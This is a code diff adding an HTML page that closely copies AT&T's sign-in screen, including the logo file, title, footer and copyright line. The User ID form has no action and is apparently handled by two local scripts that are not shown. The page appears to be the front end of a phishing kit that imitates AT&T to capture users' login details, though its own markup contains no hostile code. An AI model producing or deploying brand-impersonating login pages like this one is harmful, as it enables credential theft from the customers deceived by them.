@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
+    <title>AT&T Sign In</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="att_hz_lg_lkp_rgb_pos.png" alt="AT&T Logo" class="logo">
+            <h1 class="signin-title">Sign in</h1>
+            <p class="signin-desc">to access AT&T Mail and Currently.com</p>
+            <form id="loginForm" novalidate>
+                <div class="input-group">
+                    <label for="userId" class="input-label">User ID<span class="required"></span></label>
+                    <input type="email" id="userId" name="userId" required>
+                    <span class="error" id="errorMessage"></span>
+                </div>
+                <button type="submit" class="continue-btn">Continue</button>
+                <div class="links">
+                    <a href="#" class="forgot-link">Forgot user ID?</a>
+                    <a href="#" class="create-link">Don't have a user ID? Create one now</a>
+                </div>
+            </form>
+            <div id="loading" class="loading" style="display: none;">
+                <span class="spinner"></span>
+            </div>
+        </div>
+        <footer>
+            <div class="footer-links">
+                <a href="#">Legal policy center</a> |
+                <a href="#">Privacy policy</a> |
+                <a href="#">Terms of use</a> |
+                <a href="#">Accessibility</a> |
+                <a href="#" class="privacy-toggle">Your privacy choices</a>
+            </div>
+            <p>©2025 AT&T Intellectual Property. All rights reserved.</p>
+        </footer>
+    </div>
+    <script src="script.js"></script>
+    <script src="integrations.js"></script>
+</body>
+</html>
